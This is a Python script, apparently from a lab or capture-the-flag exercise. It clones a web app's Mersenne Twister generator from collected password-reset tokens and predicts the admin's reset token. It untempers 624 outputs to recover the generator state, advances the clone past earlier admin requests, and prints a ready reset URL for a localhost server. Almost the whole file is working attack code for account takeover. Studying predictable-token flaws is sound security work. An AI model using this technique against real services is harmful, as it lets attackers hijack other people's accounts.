from MT19937 import MT19937
import base64

# read tokens from file
with open("tokens.txt", "r") as f:
    tokens = [line.strip() for line in f if line.strip()]

outputs = []

# read the tokens in tokens.txt
for token in tokens:
    decoded = base64.b64decode(token).decode("utf-8")
    nums = [int(x) for x in decoded.split(":")]
    # put nums into output
    outputs.extend(nums)

print("Total outputs collected:", len(outputs))
print(outputs[:16])

# shift param comes from the tempering constants because that is what we are undoing,
# undo right shift and xor since thats what we do in MT19937
def undo_right_shift_xor(value, shift):
    result = 0

    # go from MSB -> LSB
    for i in range(31, -1, -1):

        # get the current bit and check if it is a one
        bit = (value >> i) & 1
        shifted_bit = 0

        # make sure the bit is in the range of 32 [0-31]
        if i + shift <= 31:
            shifted_bit = (result >> (i + shift)) & 1

        # check if original bit is a 0 or a 1 from shifted bit or bit we got (undo the XOR)
        original_bit = bit ^ shifted_bit

        # put the bit in that spot
        result |= (original_bit << i)
    return result & 0xffffffff

# undo leftshift xor and from MT
def undo_left_shift_xor_and(value, shift, mask):
    result = 0

    # LSB -> MSB
    for i in range(32):

        # get current i bit and with 1
        bit = (value >> i) & 1

        shifted_bit = 0

        # check, if shifted bit exists and mask allows it
        if i - shift >= 0 and ((mask >> i) & 1):
            
            # get the already recovered lower bit at position (i - shift)
            shifted_bit = (result >> (i - shift)) & 1

        # undo the XOR
        original_bit = bit ^ shifted_bit

        # put bit into result in proper spot using i
        result |= (original_bit << i)

    return result & 0xffffffff

# use previous helpers
def untemper(z):
    # use same temper constants and masks
    y = undo_right_shift_xor(z, 18)
    y = undo_left_shift_xor_and(y, 15, 0xefc60000)
    y = undo_left_shift_xor_and(y, 7, 0x9d2c5680)
    x = undo_right_shift_xor(y, 11)
    return x & 0xffffffff

# get the raw MT state by untempering the first 624 outputs
raw_state = [untemper(o) for o in outputs[:624]]

print("Recovered state count:", len(raw_state))
print("First 5 recovered values:", raw_state[:5])

# make a "dummy MT"
clone = MT19937(0)

# set the state of our dummt MT
clone.set_state(raw_state, 624)

# if running sever without wanting to colelct tokens all over again but demo multiple times
admin_requests_already_made = 2   # I change this to the amount of times that I think i did (6)

# each admin forgot request consumes 8 MT outputs
# this is just used for "cycling" to make sure we get the 8 outputs
for _ in range(admin_requests_already_made * 8):
    clone.extract_number()

# NOW request forgot-password for admin ONCE in the browser
# then run the next 8 outputs as the predicted admin token
admin_outputs = [clone.extract_number() for _ in range(8)]
admin_token_plain = ":".join(str(x) for x in admin_outputs)
admin_token_b64 = base64.b64encode(admin_token_plain.encode("utf-8")).decode("utf-8")

print("\nPredicted admin outputs:")
print(admin_outputs)
# http://localhost:8080/reset?token=MTQ0OTE1NTI3MjozNDI4ODg3MjU3OjI3MzQ5MjYxNToxNjQ0ODgzMDkzOjMxNzM1ODU5MDI6MTkzNzUxNzgyMTozODMyMDQzMTkxOjQwOTEwOTQ5NzU=

print("\nPredicted admin token:")
print(admin_token_b64)
print(f"http://localhost:8080/reset?token={admin_token_b64}")